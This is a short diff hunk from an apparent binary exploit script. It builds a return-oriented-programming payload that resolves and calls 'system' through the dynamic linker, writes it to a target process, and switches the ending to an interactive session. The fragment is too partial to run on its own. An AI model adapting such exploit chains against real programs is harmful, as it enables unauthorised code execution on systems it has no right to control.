@@ -20,4 +20,4 @@ buf += rop.dl_resolve_data(addr_bss+20, 'system')
 buf += rop.fill(100, buf)
 
 p.write(buf)
-p.wait(0)
+p.interact(0)
